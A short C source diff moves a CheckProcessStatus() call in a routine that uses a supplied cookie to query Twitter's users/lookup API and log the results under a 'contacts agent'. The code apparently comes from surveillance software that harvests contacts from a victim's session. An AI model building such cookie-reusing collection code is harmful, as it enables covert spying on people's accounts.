@@ -74,14 +74,14 @@ DWORD ParseCategory(char *user, char *category, char *cookie)
 		_snprintf_s(post_data, sizeof(post_data), _TRUNCATE, "user_id=%s", parser1);
 		parser1 = id_ptr;
 		
-		CheckProcessStatus();
-
 		ret_val = HttpSocialRequest(L"api.twitter.com", L"POST", L"/1/users/lookup.json", 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &response_len, cookie);	
 		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
 			SAFE_FREE(r_buffer);
 			return ret_val;
 		}
 	
+		CheckProcessStatus();
+
 		parser_inner1 = (char *)r_buffer_inner;
 	
 		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
